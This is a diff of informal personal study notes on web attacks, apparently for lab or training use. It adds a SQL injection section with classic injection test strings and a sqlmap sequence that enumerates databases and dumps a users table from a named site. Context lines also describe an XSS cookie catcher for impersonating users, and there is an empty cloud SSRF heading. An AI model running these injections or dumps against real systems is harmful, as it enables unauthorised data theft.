@@ -1,6 +1,6 @@
 # Web stuff Notes
 
-So this is going to be about 3 stuff put together Command Injection, Cross-Site Scripting and SQL injection. 
+So this is going to be about stuff put together Command Injection, Cross-Site Scripting, SQL injection, and Cloud SSRF and IMDS attack. 
 Just grouping these because man it was kinda short.
 
 ## Command Injection
@@ -64,3 +64,37 @@ The malicious payload to inject
 ```
 
 now just watch the cookie catcher and if the xss works it will trigger, using these cookies one can impersonate those users
+
+## SQL Injection
+
+testing for sqlinjection
+
+injecting a search term with: 
+- admin'
+
+continue with
+- ' or '1'='1
+
+### With sqlmap
+
+remember two rules:
+
+- Always give Sqlmap a valid URL that does not trigger an error
+- Always type the URL with quotation marks at the beginning and the end
+
+example usage:
+
+```
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin"
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" --dbs
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" -D web_app --tables
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" -D web_app -T users --dump
+```
+
+## Cloud SSRF and IMDS attack
+
+
+
+
+
+
